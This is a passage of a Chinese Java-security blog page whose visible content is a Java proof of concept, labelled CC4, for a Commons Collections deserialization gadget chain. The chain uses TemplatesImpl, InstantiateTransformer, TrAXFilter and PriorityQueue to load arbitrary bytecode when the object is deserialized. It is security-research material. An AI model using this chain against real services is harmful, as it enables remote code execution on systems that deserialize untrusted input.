+<p><img src="/images/2024/1733052326163-aa65ac66-378b-4788-a742-e5fe94e7627f.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException, TransformerConfigurationException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class templatesClass=templates.getClass();<br><br>        <span class="hljs-comment">//修改_name</span><br>        Field nameField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;Ch4nge&quot;</span>);<br><br>        <span class="hljs-comment">//修改_tfactory</span><br>        Field tfactoryField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//往_bytecodes传入字节数组</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">byte</span>[]  bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] bytecodesArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;;<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates, bytecodesArray);<br><br>        <span class="hljs-comment">//调用方法</span><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        InstantiateTransformer instantiateTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        <span class="hljs-comment">//        Transformer[] transformers = new Transformer[]&#123;</span><br>        <span class="hljs-comment">//                new ConstantTransformer(TrAXFilter.class),</span><br>        <span class="hljs-comment">//                instantiateTransformer,</span><br>        <span class="hljs-comment">//        &#125;;</span><br>        <span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><br>        <span class="hljs-comment">//实例化TransformingComparator</span><br>        TransformingComparator transformingComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br><br><br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.offer(TrAXFilter.class);<br>        priorityQueue.offer(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//反射传入chainedTransformer</span><br>        Class TransformerClass=transformingComparator.getClass();<br>        Field sizeField=TransformerClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        sizeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//将chainedTransformer换成instantiateTransformer</span><br>        sizeField.set(transformingComparator,instantiateTransformer);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" class="print-no-link">#安全研究</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CC2反序列化链分析</div>
+      <div>http://example.com/2024/10/19/CC2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/22/CC5/" title="CC5反序列化链分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CC5反序列化链分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/15/CC4/" title="CC4反序列化链分析">
+                        <span class="hidden-mobile">CC4反序列化链分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
